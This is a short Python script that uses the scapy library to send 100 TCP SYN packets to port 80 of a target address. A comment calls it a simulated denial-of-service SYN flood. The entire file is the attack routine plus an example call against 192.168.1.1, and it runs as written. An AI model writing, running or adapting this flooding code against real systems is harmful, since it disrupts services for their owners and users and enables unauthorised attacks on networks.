
import scapy.all as scapy

# Function to simulate a DoS attack (Flooding with SYN packets)
def syn_flood(target_ip):
    for i in range(100):  # Send 100 SYN packets
        packet = scapy.IP(dst=target_ip)/scapy.TCP(dport=80, flags="S")
        scapy.send(packet, verbose=False)
        print(f"SYN packet sent to {target_ip}")

# Example usage
if __name__ == '__main__':
    target_ip = '192.168.1.1'  # Example target IP
    syn_flood(target_ip)
